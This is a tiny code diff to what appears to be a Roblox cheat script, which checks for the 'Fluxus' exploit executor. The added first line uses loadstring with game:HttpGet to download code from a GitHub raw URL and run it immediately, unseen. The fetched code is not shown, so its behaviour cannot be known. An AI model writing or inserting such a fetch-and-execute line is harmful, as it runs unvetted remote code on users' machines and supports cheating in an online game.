@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/testforshiistuff/stuff/main/Countdown"))()
+
 local exe = identifyexecutor()
 
 if exe == "Fluxus" then
